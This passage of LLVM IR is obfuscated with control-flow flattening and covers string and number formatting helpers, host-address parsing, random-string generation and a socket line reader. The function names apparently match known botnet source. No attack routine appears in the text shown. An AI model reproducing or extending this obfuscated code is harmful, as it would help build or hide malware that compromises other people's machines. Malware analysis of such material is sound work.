  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1298434084, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -1286230572, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1298434084, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -571366640, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 523914746, i32 1993837748
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1993837748, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -635728379, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -635728379, label %first
    i32 -1705812565, label %16
    i32 1522131112, label %18
    i32 953374129, label %23
    i32 -900562226, label %26
    i32 -1660370946, label %29
    i32 572016136, label %34
    i32 343242942, label %35
    i32 -877048049, label %39
    i32 -913391912, label %44
    i32 -2121989833, label %45
    i32 152974911, label %46
    i32 -1545844781, label %51
    i32 787638740, label %52
    i32 -775960060, label %56
    i32 -471271313, label %61
    i32 -825224142, label %64
    i32 665456079, label %65
    i32 2051875470, label %66
    i32 1947031905, label %71
    i32 -383396403, label %78
    i32 -1448919467, label %81
    i32 814032454, label %82
    i32 643535846, label %86
    i32 -469020347, label %91
    i32 409825641, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -1705812565, i32 152974911
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 1522131112, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 953374129, i32 -1660370946
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -900562226, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 1522131112, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 572016136, i32 343242942
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -877048049, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -877048049, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -913391912, i32 -2121989833
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 -2121989833, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 152974911, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 665456079, i32 -1545844781
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 787638740, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -775960060, i32 -825224142
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -471271313, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 787638740, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 665456079, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 2051875470, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1947031905, i32 -1448919467
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -383396403, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 2051875470, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 814032454, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 643535846, i32 409825641
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -469020347, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 814032454, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1247673971, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1247673971, label %first
    i32 114797315, label %26
    i32 2086561793, label %34
    i32 1339927565, label %38
    i32 -143669193, label %42
    i32 1197361192, label %46
    i32 564359260, label %49
    i32 -1730934986, label %54
    i32 -1674736579, label %58
    i32 -398391853, label %65
    i32 -1488268969, label %71
    i32 1975179190, label %80
    i32 983866188, label %84
    i32 -1925021838, label %88
    i32 1427394924, label %93
    i32 1679536700, label %99
    i32 488878660, label %102
    i32 680427574, label %103
    i32 -998427011, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 114797315, i32 2086561793
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -998427011, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1339927565, i32 564359260
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -143669193, i32 564359260
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1197361192, i32 564359260
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 564359260, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -1730934986, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -1674736579, i32 1975179190
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -398391853, i32 -1488268969
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -1488268969, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -1730934986, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 983866188, i32 680427574
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1925021838, i32 1679536700
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1427394924, i32 1679536700
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 488878660, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 488878660, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 680427574, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -998427011, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 925420505, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 925420505, label %first
    i32 1420130488, label %8
    i32 -2095730662, label %16
    i32 275355727, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 1420130488, i32 -2095730662
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 275355727, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 275355727, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -237064014, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -237064014, label %first
    i32 2084611460, label %13
    i32 -1607803647, label %14
    i32 1530504524, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 2084611460, i32 -1607803647
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1530504524, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1530504524, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 722565946, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 722565946, label %6
    i32 58435153, label %11
    i32 -1069471846, label %20
    i32 -215245971, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 58435153, i32 -215245971
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1069471846, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 722565946, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 1602443615, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1602443615, label %24
    i32 -2022228181, label %33
    i32 -1931013143, label %50
    i32 -937498056, label %51
    i32 -2081016315, label %55
    i32 -412385235, label %58
    i32 585512712, label %67
    i32 1658141487, label %84
    i32 932866955, label %87
    i32 -930333032, label %88
    i32 -1095412667, label %89
    i32 699671108, label %91
    i32 -760171236, label %96
    i32 809668466, label %101
    i32 -1990087706, label %103
    i32 2045981556, label %111
    i32 -835879724, label %112
    i32 -2078780560, label %115
    i32 -1722605297, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #6, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -2022228181, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -1931013143, i32 -1095412667
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -937498056, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -2081016315, i32 -930333032
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 -412385235, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #6, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 585512712, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 1658141487, i32 932866955
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 -937498056, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -930333032, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -1095412667, i32* %switchVar
